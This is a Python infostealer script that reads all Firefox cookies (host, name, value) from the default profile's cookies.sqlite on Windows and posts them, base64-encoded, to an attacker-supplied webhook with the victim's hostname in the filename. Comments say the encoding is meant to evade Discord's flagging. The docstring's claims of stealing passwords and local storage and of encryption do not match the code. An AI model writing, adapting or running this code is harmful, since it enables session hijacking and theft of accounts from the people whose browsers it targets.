'''
An infostealer that steals Firefox cookies/passwords/local storage instead of Chrome.
Then, it encrypts and exfiltrates said local storage to a webhook.

This is much simpler than the Chrome cookie stealer because Firefox does *NOT* encrypt their sqlite3 files.
This does not require Firefox to be closed. Firefox does not lock the cookie file, and just creates a temp hidden one

@see https://www.cyberark.com/resources/threat-research-blog/the-current-state-of-browser-cookies
'''

# 🚨 MAKE SURE TO FILL OUT THIS CONFIG!!!!
# Webhook URL - the URL to exfiltrate the data to
webhook_url = "WEBHOOK_URL_HERE"

import sqlite3
import requests

# Base64 is not encryption. That being said, we don't really care about confidentiality here.
# The user knows their own cookie, and we're trying actively steal cookies - not hide/secure them
# We're just encoding it to prevent Discord from auto-flagging us
from base64 import b64encode

from io import BytesIO      # Used for in-memory file
from os.path import expandvars, join
from os import listdir, getenv

def get_cookie_file() -> str:
    '''
    Resolves and returns the sqllite database file path for Firefox cookies.
    Returns:
        str: The full path to the cookies.sqlite file
    '''
    
    # Resolve %APPDATA%
    real_dir = expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles")
    
    # Get default release. A part of the file name is random, but this will usually always have default-release
    default_profile = [file for file in listdir(real_dir) if "default-release" in file][0]
    full_path = join(real_dir, default_profile, "cookies.sqlite")
    
    return full_path

def steal_cookies() -> bytes:
    '''
    Reads the sqllite cookie file, steals, the cookies, and parses it.
    Returns:
        bytes: The cookies in a binary CSV String
    '''
    
    # Get the cookie file path
    cookie_file_path = get_cookie_file()
    
    # This is the CSV string we'll append to
    csv_data = b"host,name,value\n"
    
    # Open File to parse and write to the csv_data
    conn = sqlite3.connect(cookie_file_path)
    cursor = conn.cursor()
    db_results = cursor.execute("SELECT name, value, host FROM moz_cookies").fetchall()
    
    for cookie_entry in db_results:
        name, value, host = cookie_entry
        csv_data += f"{host},{name},{value}\n".encode()
        
    return csv_data  
    
def get_pc_name() -> str:
    '''
    Returns the hostname of this PC.
    Returns:
        str: The hostname of this PC
    '''
    return getenv("COMPUTERNAME") or getenv("HOSTNAME")
    
def exfil_cookies(csv_data: bytes):
    '''
    Encodes the csv_data into base64, puts it in an in-memory file, and exfiltrates it to the webhook_url.
    Args:
        csv_data (bytes): The cookies in a binary CSV String
    '''
    
    # Encodes csv_data in base64
    encoded_data = b64encode(csv_data) 
    
    # Creates and writes to an in-memory file
    in_mem_file = BytesIO(encoded_data)
    in_mem_file.seek(0)  # Move to the start of the file so requests reads from start
    
    # Exfils the file to the endpoint URL
    file_name = f"{get_pc_name()}_firefox_cookies.csv"
    requests.post(webhook_url, files={"file": (file_name, in_mem_file)})
    
def main():
    csv_data = steal_cookies()
    exfil_cookies(csv_data)

main()